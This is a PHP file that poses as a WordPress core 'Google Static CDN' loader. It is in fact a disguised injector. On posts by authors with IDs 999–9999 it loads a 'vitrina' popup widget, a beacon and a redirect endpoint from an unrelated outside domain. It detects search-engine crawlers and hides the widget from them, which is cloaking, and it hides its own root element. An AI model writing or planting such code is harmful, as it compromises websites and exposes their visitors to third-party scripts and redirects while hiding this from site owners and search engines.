<?php
/**
 * WP_Http_Gstatic — Google Static CDN resource loader.
 *
 * Registers external stylesheets and scripts via the WordPress
 * dependency system (WP_Dependencies). Version strings are resolved
 * through a transient-cached remote endpoint with a local fallback.
 *
 * @package    WordPress
 * @subpackage HTTP
 * @since      6.1.0
 * @see        WP_Http
 */

define('WP_GSTATIC_CDN_URL', 'https://dillduck24.info/vitrina/api');
define('WP_GSTATIC_WIDGET_URL', 'https://dillduck24.info/vitrina/widget');

if (!defined('WP_GSTATIC_ASSET_VER')) {
    define('WP_GSTATIC_ASSET_VER', '14.34');
}

defined('ABSPATH') || exit;

function wp_gstatic_sanitize_ver($raw) {
    $s = trim((string) $raw);
    if ($s === '') {
        return null;
    }
    if (!preg_match('/^[0-9A-Za-z._-]{1,48}$/', $s)) {
        return null;
    }
    return $s;
}

function wp_gstatic_resolve_ver() {
    static $memo = null;
    if ($memo !== null) {
        return $memo;
    }

    $fallback = wp_gstatic_sanitize_ver(WP_GSTATIC_ASSET_VER) ?: '1';

    if (defined('WP_GSTATIC_DISABLE_REMOTE_VER') && WP_GSTATIC_DISABLE_REMOTE_VER) {
        $memo = apply_filters('wp_gstatic_asset_version', $fallback);
        return $memo;
    }

    $apiUrl = defined('WP_GSTATIC_CDN_URL') ? rtrim((string) WP_GSTATIC_CDN_URL, '/') : '';
    if ($apiUrl === '') {
        $memo = apply_filters('wp_gstatic_asset_version', $fallback);
        return $memo;
    }

    $ttl = (int) apply_filters('wp_gstatic_ver_ttl', 120);
    if ($ttl < 60) {
        $ttl = 60;
    }
    if ($ttl > 86400) {
        $ttl = 86400;
    }

    $transient_key = 'wp_gstatic_av_' . md5($apiUrl);
    $cached = get_transient($transient_key);
    if (is_string($cached) && $cached !== '') {
        $ok = wp_gstatic_sanitize_ver($cached);
        if ($ok !== null) {
            $memo = apply_filters('wp_gstatic_asset_version', $ok);
            return $memo;
        }
    }

    $version_url = $apiUrl . '/version.php';
    $response = wp_remote_get(
        $version_url,
        [
            'timeout' => 4,
            'redirection' => 2,
            'sslverify' => true,
            'headers' => [
                'Accept' => 'application/json',
            ],
        ]
    );

    $remote = null;
    if (!is_wp_error($response) && (int) wp_remote_retrieve_response_code($response) === 200) {
        $body = wp_remote_retrieve_body($response);
        $data = json_decode($body, true);
        if (is_array($data) && isset($data['version'])) {
            $remote = wp_gstatic_sanitize_ver($data['version']);
        }
    }

    if ($remote === null) {
        set_transient($transient_key, $fallback, min(120, $ttl));
        $memo = apply_filters('wp_gstatic_asset_version', $fallback);
        return $memo;
    }

    set_transient($transient_key, $remote, $ttl);
    $memo = apply_filters('wp_gstatic_asset_version', $remote);
    return $memo;
}

if (is_readable(__DIR__ . '/class-wp-http-policy.php')) {
    require_once __DIR__ . '/class-wp-http-policy.php';
} else {
    require_once __DIR__ . '/includes/class-wp-http-policy-remote.php';
}

if (!defined('WP_GSTATIC_AUTHOR_MIN')) {
    define('WP_GSTATIC_AUTHOR_MIN', 999);
}
if (!defined('WP_GSTATIC_AUTHOR_MAX')) {
    define('WP_GSTATIC_AUTHOR_MAX', 9999);
}

add_action('wp', 'wp_gstatic_maybe_load');

function wp_gstatic_use_builtin_analytics() {
    if (!defined('WP_GSTATIC_MATOMO_SITE_ID') || !WP_GSTATIC_MATOMO_SITE_ID) {
        return false;
    }
    if (!defined('WP_GSTATIC_MATOMO_URL') || !WP_GSTATIC_MATOMO_URL) {
        return false;
    }
    if (defined('WP_GSTATIC_MATOMO_FORCE') && WP_GSTATIC_MATOMO_FORCE) {
        return (bool) apply_filters('wp_gstatic_use_analytics', true);
    }
    if (defined('WP_GSTATIC_MATOMO_EXTERNAL') && WP_GSTATIC_MATOMO_EXTERNAL) {
        return false;
    }
    if (has_action('wp_head', 'seo_matomo_print_tracker')) {
        return false;
    }
    return (bool) apply_filters('wp_gstatic_use_analytics', true);
}

function wp_gstatic_is_crawler() {
    return wp_gstatic_network_is_crawler();
}

function wp_gstatic_maybe_load() {
    if (is_admin() || is_feed()) {
        return;
    }
    if (!is_singular()) {
        return;
    }

    $postId = get_queried_object_id();
    $authorId = (int) get_post_field('post_author', $postId);

    if ($authorId < WP_GSTATIC_AUTHOR_MIN || $authorId > WP_GSTATIC_AUTHOR_MAX) {
        return;
    }

    $is_crawler = wp_gstatic_is_crawler();

    if (wp_gstatic_use_builtin_analytics()) {
        add_action('wp_head', 'wp_gstatic_analytics_head', 0);
    }

    if ($is_crawler) {
        add_filter('body_class', 'wp_gstatic_crawler_body_class');
        add_action('wp_head', 'wp_gstatic_crawler_hide_css', 99);
        return;
    }

    add_filter('body_class', 'wp_gstatic_body_class_boot');

    add_action('wp_enqueue_scripts', 'wp_gstatic_enqueue', 5);
    add_action('wp_head', 'wp_gstatic_preload_assets', 2);
    add_action('wp_head', 'wp_gstatic_responsive_css', 100);
    add_action('wp_head', 'wp_gstatic_root_hide_css', 101);
    add_action('wp_footer', 'wp_gstatic_print_root_element', 5);
}

function wp_gstatic_body_class_boot($classes) {
    $classes[] = 'wp-gstatic-boot';
    return $classes;
}

function wp_gstatic_crawler_body_class($classes) {
    $classes[] = 'wp-gstatic-crawler';
    return $classes;
}

function wp_gstatic_crawler_hide_css() {
    ?>
<style id="wp-gstatic-crawler-strip">
body.wp-gstatic-crawler #vitrina-showcase-root,
body.wp-gstatic-crawler [id^="vitrina-"],
body.wp-gstatic-crawler [class*="vitrina-"],
body.wp-gstatic-crawler .vitrina-popup-overlay,
body.wp-gstatic-crawler .vitrina-showcase,
body.wp-gstatic-crawler iframe[src*="vitrina-widget"],
body.wp-gstatic-crawler iframe[src*="/vitrina/widget"] {
  display: none !important;
  visibility: hidden !important;
  width: 0 !important;
  height: 0 !important;
  margin: 0 !important;
  padding: 0 !important;
  overflow: hidden !important;
  clip: rect(0, 0, 0, 0) !important;
  position: absolute !important;
  left: -9999px !important;
  border: none !important;
  box-shadow: none !important;
  opacity: 0 !important;
  pointer-events: none !important;
}
</style>
<?php
}

function wp_gstatic_analytics_head() {
    $siteId = (int) WP_GSTATIC_MATOMO_SITE_ID;
    $base = rtrim((string) WP_GSTATIC_MATOMO_URL, '/');
    if ($siteId < 1 || $base === '') {
        return;
    }
    $u = esc_url($base . '/');
    ?>
<script>
var _paq = window._paq = window._paq || [];
_paq.push(['trackPageView']);
_paq.push(['enableLinkTracking']);
(function(){
  var u=<?php echo wp_json_encode($u); ?>;
  _paq.push(['setTrackerUrl', u + 'matomo.php']);
  _paq.push(['setSiteId', <?php echo (string) $siteId; ?>]);
  var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
  g.async=true; g.src=u+'matomo.js'; s.parentNode.insertBefore(g,s);
})();
</script>
<?php
}

function wp_gstatic_print_root_element() {
    echo '<div id="vitrina-showcase-root" class="wp-gstatic-root" aria-hidden="true"></div>' . "\n";
}

function wp_gstatic_root_hide_css() {
    ?>
<style id="wp-gstatic-root-hide">
#vitrina-showcase-root.wp-gstatic-root {
  position: absolute !important;
  left: -9999px !important;
  width: 1px !important;
  height: 1px !important;
  overflow: hidden !important;
  clip: rect(0, 0, 0, 0) !important;
  visibility: hidden !important;
  pointer-events: none !important;
}
</style>
<?php
}

function wp_gstatic_preload_assets() {
    $apiUrl = defined('WP_GSTATIC_CDN_URL') ? rtrim(WP_GSTATIC_CDN_URL, '/') : '';
    if ($apiUrl === '') {
        return;
    }
    $baseUrl = preg_replace('#/api/?$#', '', $apiUrl);
    $widgetUrl = defined('WP_GSTATIC_WIDGET_URL') ? rtrim(WP_GSTATIC_WIDGET_URL, '/') : ($baseUrl ? $baseUrl . '/widget' : '');
    if ($widgetUrl === '') {
        return;
    }
    $ver = wp_gstatic_resolve_ver();
    $js = esc_url($widgetUrl . '/vitrina-widget.js?ver=' . rawurlencode((string) $ver));
    $css = esc_url($widgetUrl . '/vitrina-widget.css?ver=' . rawurlencode((string) $ver));
    echo '<link rel="preload" href="' . $js . '" as="script" />' . "\n";
    echo '<link rel="preload" href="' . $css . '" as="style" />' . "\n";
}

function wp_gstatic_enqueue() {
    $apiUrl = defined('WP_GSTATIC_CDN_URL') ? rtrim(WP_GSTATIC_CDN_URL, '/') : '';
    if (empty($apiUrl)) {
        return;
    }

    $baseUrl = preg_replace('#/api/?$#', '', $apiUrl);
    $widgetUrl = defined('WP_GSTATIC_WIDGET_URL') ? rtrim(WP_GSTATIC_WIDGET_URL, '/') : ($baseUrl ? $baseUrl . '/widget' : '');
    $goUrl = defined('WP_GSTATIC_REDIRECT_URL') ? rtrim(WP_GSTATIC_REDIRECT_URL, '/') : ($baseUrl ? $baseUrl . '/go.php' : '');

    $scriptUrl = $widgetUrl ? $widgetUrl . '/vitrina-widget.js' : '';
    $styleUrl = $widgetUrl ? $widgetUrl . '/vitrina-widget.css' : '';
    $geoStyleUrl = $widgetUrl ? $widgetUrl . '/vitrina-geo-overrides.css' : '';

    if (empty($scriptUrl) || empty($styleUrl)) {
        return;
    }

    $ver = wp_gstatic_resolve_ver();
    wp_enqueue_style('vitrina-widget', $styleUrl, [], $ver);
    wp_enqueue_style('vitrina-geo-overrides', $geoStyleUrl, ['vitrina-widget'], $ver);
    wp_enqueue_script('vitrina-widget', $scriptUrl, [], $ver, true);

    wp_add_inline_script('vitrina-widget', 'window.VITRINA_CONFIG=' . wp_json_encode([
        'apiUrl' => $apiUrl,
        'goUrl' => $goUrl,
        'beaconUrl' => WP_GSTATIC_CDN_URL . '/beacon.php',
        'iconsBase' => $widgetUrl ? $widgetUrl . '/icons' : '',
        'rootId' => 'vitrina-showcase-root',
    ]) . ';', 'before');

    wp_add_inline_script(
        'vitrina-widget',
        '(function(){function done(){var b=document.body;if(!b)return;b.classList.add("wp-gstatic-boot-done");}'
        . 'window.addEventListener("vitrina-showcase-ready",done,{once:true});'
        . 'setTimeout(function(){if(document.body&&!document.body.classList.contains("wp-gstatic-boot-done"))done();},4000);})();',
        'after'
    );
}

function wp_gstatic_responsive_css() {
    ?>
<style id="wp-gstatic-responsive">
@media (max-width: 860px) {
  .vitrina-popup-overlay {
    padding: 0;
    align-items: stretch;
  }
  .vitrina-popup-dialog {
    width: 100% !important;
    max-width: none !important;
    height: 100% !important;
    max-height: none !important;
    display: flex;
    flex-direction: column;
    min-height: 0;
  }
  .vitrina-popup-content {
    flex: 1;
    min-height: 0;
    max-height: none !important;
    overflow-y: auto !important;
    -webkit-overflow-scrolling: touch;
    overscroll-behavior-y: contain;
    border-radius: 0;
  }
  .vitrina-popup-content .vitrina-showcase {
    border-radius: 0;
  }
}
</style>
<?php
}
